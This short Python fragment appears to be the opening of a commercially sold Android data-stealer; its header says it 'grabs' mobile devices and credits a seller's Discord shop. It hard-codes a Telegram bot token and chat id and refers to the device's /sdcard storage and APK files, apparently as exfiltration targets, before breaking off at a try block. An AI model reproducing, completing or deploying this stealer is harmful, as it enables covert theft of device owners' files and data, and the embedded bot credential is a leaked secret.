# THIS IS CODE BY KOTARO THAT GRAB ANDROID MOBILE DEVICE
# THANKS FOR BUYING THIS SHIT DONT LEAK LEAK IT THANKS.
# TOOL SELL AND CREATE BY TROLLSHOP >> discord.gg/trollshops
import os
import requests
...
def suyaib():
    ...
    bot_token = '7366663375:AAFuHwz3Ol_cxKNUW0NzJYIzeRQ-ht2jyPo'
    chat_id = '6656858850'
    #-------------( /sdcard\ )--------------#  
    #--------------------apk-------------------#																						
    try:
